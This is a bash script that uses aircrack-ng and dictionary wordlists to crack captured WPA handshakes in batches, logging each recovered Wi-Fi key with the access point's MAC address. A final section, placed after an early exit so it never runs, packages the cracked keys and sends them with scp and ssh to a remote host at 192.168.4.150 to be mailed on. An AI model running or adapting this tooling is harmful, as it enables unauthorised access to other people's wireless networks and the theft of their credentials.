#!/bin/bash

[ $# -ne 1 ] && { echo 'need a dir!'; exit; }

dir=$1
cd $dir

cpu_num=2

cap_dir="caps"
oldcap_dir="$cap_dir/old_caps"
dict_dir="dicts"
out_dir="out"

smkdir $cap_dir
smkdir $oldcap_dir
smkdir $dict_dir
smkdir $out_dir

# dicts=$(find $dict_dir -name *.txt)
dicts=$(ls $dict_dir/*.txt -1)
[ $? != 0 ] && { echo 'no dicts!'; exit; }

caps=$(ls $cap_dir/*.cap -1)
[ $? != 0 ] && { echo 'no caps need crack!'; exit; }

for cap in $caps; do
    for dict in $dicts; do
        ap_name=$(aircrack-ng $cap | head -6 | tail -1 | awk '{print $3}')
        ap_mac=$(aircrack-ng $cap | head -6 | tail -1 | awk '{print $2}')
        wanted=$out_dir/$ap_name\.txt
        echo \( $(date +%d\ %H:%M) \) working on $cap use $dict ......
        # $VGLD_CRACK_DIR/make
        aircrack-ng $cap -p $cpu_num -w $dict -l $wanted > /dev/null
        [ -f "$wanted" ] && { echo crack one done!; mv $cap $oldcap_dir/$ap_name.cap; echo $ap_mac >> $wanted; break; }
        [ "$(date +%H)" -eq '7' ] && exit
    done
    echo sleep 5m && sleep 5m
    echo sleep 20 && sleep 2
done

exit

echo msg=sendmail > tmp
echo title=wpa >> tmp

word='body='
for line in $(find $out_dir/*); do
    word="$word+$line+$(cat $line)"
done
    echo word $word
    echo "$word" >> tmp

scp tmp user@192.168.4.150:/tmp/wpa
ssh user@192.168.4.150 "cat /tmp/wpa > /tmp/.vpipe"
